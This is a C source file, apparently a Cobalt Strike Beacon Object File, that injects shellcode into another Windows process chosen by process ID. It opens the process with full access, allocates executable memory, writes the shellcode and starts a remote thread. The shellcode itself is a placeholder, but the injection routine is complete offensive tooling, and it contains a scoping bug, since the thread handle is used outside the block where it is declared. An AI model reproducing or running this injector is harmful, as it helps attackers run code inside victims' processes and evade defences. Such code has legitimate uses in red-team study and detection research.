#include <windows.h>
#include "beacon.h"

WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess (DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateRemoteThread (HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle (HANDLE hObject);

void go(char * argc, int len)
{
	unsigned char shellcode[] = "<insert C shellcode here>";
	datap	parser;

	BeaconDataParse(&parser, argc, len);
	DWORD pid = BeaconDataShort(&parser);
	HANDLE Process_Handle = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
	PVOID Alloc = KERNEL32$VirtualAllocEx(Process_Handle, NULL, sizeof shellcode, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (Alloc)
	{
		KERNEL32$WriteProcessMemory(Process_Handle, Alloc, shellcode, sizeof shellcode, NULL);
		HANDLE Remote_Thread = KERNEL32$CreateRemoteThread(Process_Handle, NULL, 0, (LPTHREAD_START_ROUTINE)Alloc, NULL, 0, NULL);
	}
	KERNEL32$CloseHandle(Remote_Thread);
	KERNEL32$CloseHandle(Process_Handle);
}
